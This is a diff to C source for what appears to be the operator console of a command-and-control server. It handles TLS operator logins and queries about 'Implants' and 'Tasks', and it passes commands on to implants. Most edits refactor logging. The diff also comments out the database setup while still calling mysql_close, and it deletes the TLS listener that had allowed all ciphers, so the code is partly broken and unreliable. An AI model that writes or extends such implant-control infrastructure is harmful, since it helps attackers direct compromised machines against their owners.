@@ -25,6 +25,10 @@
 
 #include "db.h"
 #include "logs.h"
+#include "common.h"
+
+
+
 
 char USERNAME[0x100];
 
@@ -39,7 +43,8 @@ int autheticate(SSL *ssl) {
     cJSON *creds = cJSON_Parse(auth);
 
     if (creds == NULL) {
-        fprintf(stderr, "Failed to parse JSON: %s\n", auth);
+        //fprintf(stderr, "Failed to parse JSON: %s\n", auth);
+        log_message(LOG_WARN, "Failed to parse JSON from Operator (Authenticating): %s", auth);
         cJSON_Delete(creds);
         return -1;
     }
@@ -47,20 +52,23 @@ int autheticate(SSL *ssl) {
     cJSON *username = cJSON_GetObjectItem(creds, "username");
     
     if (username == NULL || !cJSON_IsString(username)) {
-        fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
+        //fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
+        log_message(LOG_WARN, "Missing or invalid 'Username' field in JSON\n");
         cJSON_Delete(creds);
         return -1;
     }
     cJSON *password = cJSON_GetObjectItem(creds, "password");
     if (password == NULL || !cJSON_IsString(password)) {
-        fprintf(stderr, "Missing or invalid 'Password' field in JSON\n");
+        //printf(stderr, "Missing or invalid 'Password' field in JSON\n");
+        log_message(LOG_WARN, "Missing or invalid 'Password' field in JSON");
         cJSON_Delete(creds);
         return -1;
     }
 
     cJSON *reply = cJSON_CreateObject();
     if (reply == NULL) {
-        fprintf(stderr, "Failed to create cJSON object\n");
+        //fprintf(stderr, "Failed to create cJSON object\n");
+        log_message(LOG_WARN, "Failed to create cJSON object");
         cJSON_Delete(creds);
         // Handle error or exit
         return -1;
@@ -71,7 +79,7 @@ int autheticate(SSL *ssl) {
         char *reply_ = cJSON_Print(reply);
         //send(sock, reply_, strlen(reply_), 0);
         SSL_write(ssl, reply_, strlen(reply_));
-        log_message(LOG_INFO, "Operator failed to authenticate");
+        log_message(LOG_WARN, "Operator failed to authenticate");
         free(reply_);
         free(reply);
         cJSON_Delete(creds);
@@ -82,7 +90,8 @@ int autheticate(SSL *ssl) {
     char *reply_ = cJSON_Print(reply);
     //send(sock, reply_, strlen(reply_), 0);
     SSL_write(ssl, reply_, strlen(reply_));
-    strncpy(USERNAME, username->valuestring, sizeof(USERNAME));
+    strncpy(USERNAME, username->valuestring, sizeof(USERNAME) -1);
+    USERNAME[sizeof(USERNAME) - 1] = '\0';
     log_message(LOG_INFO, "Operator [%s] authenticated successfully",USERNAME);
     free(reply_);
     free(reply);
@@ -145,9 +154,13 @@ char *interact_with_implant(cJSON *rinfo) {
 
 
 void *operator_handler(void *Args) {
-    struct operator_handler_args_t {
-        SSL *ssl;
-    };
+    //con = mysql_init(NULL);
+    //if (!mysql_real_connect(con, g_dbconf->host, g_dbconf->user, g_dbconf->pass, g_dbconf->db, 0, NULL, 0)) {
+    //    log_message(LOG_ERROR, "Database Connect Error: %s", mysql_error(con));
+    //    return NULL;
+    //}
+//
+    //mysql_thread_init();
 
     struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
     SSL *ssl = args->ssl;
@@ -181,21 +194,117 @@ void *operator_handler(void *Args) {
         cJSON *requested_info = cJSON_Parse(buffer);
         if (requested_info == NULL) {
             //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
-            log_message(LOG_ERROR, "Failed to parse JSON: %s", buffer);
+            log_message(LOG_ERROR, "Failed to parse JSON [Operator Handler]: %s", buffer);
             return NULL;
         }
 
         cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
-        if (about == NULL || !cJSON_IsString(about)) {
+        if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
             //fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
-            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON");
+            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
             cJSON_Delete(requested_info);
             return NULL;
         }
 
-        if (strcmp(about->valuestring, "Implants") == 0){ // all info about implants
+        if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
             char *implants = GetData("Implants");
             //send(sock, agents, strlen(agents), 0);
+            //if (implants == NULL) {
+            //    // handle this
+            //    continue;
+            //    }
+            
+            SSL_write(ssl, implants, strlen(implants));
+            free(implants);
+        } else if (strcmp(about->valuestring, "Tasks") == 0) {
+            char *tasks = GetData("Tasks");
+            //send(sock, tasks, strlen(tasks), 0);
+            SSL_write(ssl, tasks, strlen(tasks));
+            free(tasks);
+        } else if (strcmp(about->valuestring, "implant_id") == 0) {
+            char *data = interact_with_implant(requested_info);
+            if (data == NULL) {
+                //send(sock, "ERROR", strlen("ERROR"), 0);
+                //SSL_write(ssl, reply_, sizeof("ERROR"));    
+                continue;
+            }
+            //send(sock, data, strlen(data), 0);
+            SSL_write(ssl, data, strlen(data));
+            free(data);
+        } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
+            log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
+            return NULL;
+        }
+        cJSON_Delete(requested_info);
+    }
+        
+    log_message(LOG_INFO, "Closed connection");
+    SSL_free(ssl);
+
+    mysql_close(con);
+    //mysql_thread_end();
+    return NULL;
+}
+
+
+/*
+
+void *operator_handler(void *Args) {
+    
+
+
+    struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
+    SSL *ssl = args->ssl;
+
+    // 3 tries
+    int try = 1;
+    do {
+        if (autheticate(ssl) == 0) {
+            goto START;
+        } 
+        try++;
+    } while (try <= 3);
+
+
+    return NULL;
+    
+    
+    // operator requesting infomartion or add new tasks
+    START:
+    while (1) {
+        char buffer[1024];
+        memset(buffer, 0, sizeof(buffer));
+        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
+        if (bytes_received <= 0) {
+            //perror("recv failed");
+            log_message(LOG_ERROR, "Failed to receive data from operator");
+            return NULL;
+        }
+
+        buffer[bytes_received] = '\0'; 
+        cJSON *requested_info = cJSON_Parse(buffer);
+        if (requested_info == NULL) {
+            //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
+            log_message(LOG_ERROR, "Failed to parse JSON [Operator Handler]: %s", buffer);
+            return NULL;
+        }
+
+        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
+        if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
+            //fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
+            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
+            cJSON_Delete(requested_info);
+            return NULL;
+        }
+
+        if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
+            char *implants = GetData("Implants");
+            //send(sock, agents, strlen(agents), 0);
+            //if (implants == NULL) {
+            //    // handle this
+            //    continue;
+            //    }
+            
             SSL_write(ssl, implants, strlen(implants));
             free(implants);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
@@ -225,117 +334,4 @@ void *operator_handler(void *Args) {
     return NULL;
 }
 
-
-void *Operator_conn(void* args) {
-    init();
-
-    struct Args_t {
-        char cert[BUFFER_SIZE];
-        char key[BUFFER_SIZE];
-        int port;
-    };
-
-    struct Args_t *Args = (struct Args_t*)args;
-
-    char cert[BUFFER_SIZE];
-    char key[BUFFER_SIZE];
-    int OPERATOR_PORT = Args->port;
-
-    strncpy(cert, Args->cert, BUFFER_SIZE);
-    strncpy(key, Args->key, BUFFER_SIZE);
-
-        // generate certificates if they dont exesits
-    if (access(cert, F_OK) != 0 || access(key, F_OK) != 0) {
-        generate_key_and_cert(cert, key);
-    }
-    free(args);
-
-    struct sockaddr_in clientAddr;
-    socklen_t client_len = sizeof(clientAddr);
-    int serverSock;
-
-
-
-    serverSock = socket(AF_INET, SOCK_STREAM, 0);
-    if (serverSock == -1) {
-        perror("Socket creation failed for operator console");
-        sleep(60);
-        return NULL;
-    }
-
-    struct sockaddr_in serverAddr;
-    serverAddr.sin_addr.s_addr = INADDR_ANY;
-    serverAddr.sin_port = htons(OPERATOR_PORT);
-    serverAddr.sin_family = AF_INET;
-
-    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
-        perror("binding failed For operator console\n");
-        close(serverSock);
-        sleep(60);
-        return NULL;
-    }
-
-    if (listen(serverSock, SOMAXCONN) == -1) {
-        perror("Listen Failed for operator console\n");
-        close(serverSock);
-        sleep(60);
-        return NULL;
-    }
-    
-    // openssl to socket
-    const SSL_METHOD *method = TLS_server_method();
-    SSL_CTX *ctx = SSL_CTX_new(method);
-    if (!ctx) {
-        perror("Unable to create SSL context");
-        sleep(60);
-        return NULL;
-    }
-    SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0");  // Allows all ciphers for debugging
-       // load certificates and key
-       SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM);
-       SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM);
-    
-    
-    int sock;
-    while (1) {
-        if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
-            perror("Accept failed");
-            continue;
-        }
-        
-        SSL *ssl = SSL_new(ctx);
-        SSL_set_fd(ssl, sock);
-        // perform tls handshake
-        if (SSL_accept(ssl) <= 0) {
-            log_message(LOG_ERROR, "TLS Handshake failed ");
-            //ERR_print_errors_fp(stderr);
-            SSL_free(ssl);
-            close(sock);
-            continue;
-        }
-        // port = ntohs(clientAddr.sin_port) 
-        // ip = inet_ntoa(client_addr.sin_addr)
-
-        struct operator_handler_args_t {
-            SSL *ssl;
-        };
-
-        struct operator_handler_args_t *args = malloc(sizeof(*args));
-        args->ssl = ssl;
-
-        pthread_t thread;
-        if (pthread_create(&thread, NULL, operator_handler, (void*)args) < 0) {
-            log_message(LOG_ERROR, "Failed to create operator thread");
-            free(args);
-            continue;
-        }
-        log_message(LOG_INFO, "Operator Console connected successfully : Remote address : [%s:%d]", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));
-        // Detach thread so resources are automatically freed on exit
-        pthread_detach(thread);
-    }
-
-    close(sock);
-    close(serverSock);
-    return NULL;
-
-}
+*/
